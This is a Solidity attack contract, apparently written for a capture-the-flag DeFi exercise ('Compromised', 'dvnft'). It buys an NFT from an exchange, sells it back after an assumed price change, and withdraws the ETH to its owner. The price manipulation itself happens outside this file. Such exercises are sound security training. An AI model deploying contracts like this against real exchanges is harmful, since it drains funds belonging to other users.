// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IExchange} from "./Interfaces/IExchange.sol";
import {IERC721} from "openzeppelin-contracts/interfaces/IERC721.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721Metadata} from "openzeppelin-contracts/token/ERC721/extensions/IERC721Metadata.sol";




// need an interface for the contract
contract CompromisedAttack is IERC721Receiver {


    IExchange internal Exchange;
    IERC721 internal dvnft;


    address payable internal owner;
    uint256 tokenID; 


    error NotOWner();

    modifier onlyOwner(){
        if(msg.sender != owner) revert NotOWner();
        _;
    }

    // constructor initializes exchange contract and ownr
    constructor(address _ExchangeAddress, address _owner, address _dvnftAddress){
        owner = payable(_owner);
        Exchange = IExchange(_ExchangeAddress);
        dvnft = IERC721(_dvnftAddress);
    }

    function buyDiscountedNFT() payable external onlyOwner{
       tokenID = Exchange.buyOne{value: msg.value}();

       // once bought we need to approve the exhange address the ability to move the nft
       dvnft.approve(address(Exchange), tokenID);
    }

    // function to sellProfit
    function cashOut() external onlyOwner {
        Exchange.sellOne(tokenID);
    }

    function withdraw() external onlyOwner {
        (bool success, bytes memory __) = payable(owner).call{value: address(this).balance}("");
        require(success, "something went wrong");
    }

    function onERC721Received(address operator, address from, uint256 tokenID, bytes calldata data) external override returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }
        

    // function to withdraw eth to onlyOwner
    receive() external payable {}

    //@note Need to implement an NFT receiver so that this contract can recieve the nft

}
